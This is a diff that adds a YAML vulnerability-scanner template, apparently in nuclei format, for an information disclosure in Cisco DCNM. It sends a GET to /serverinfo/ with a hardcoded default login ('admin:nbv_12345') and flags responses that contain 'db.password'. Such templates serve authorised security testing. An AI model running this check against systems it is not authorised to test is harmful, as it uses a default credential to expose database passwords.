@@ -1,0 +1,22 @@
+id: poc-yaml-cisco-dcnm-serverinfo-disclosure
+info:
+  name: Cisco DCNM ServerInfo Information Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure,cisco
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/serverinfo/"
+    headers:
+      Authorization: Basic {{base64('admin:nbv_12345')}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "db.password"
+      - type: word
+        part: body
+        words:
+          - "Server Infos"
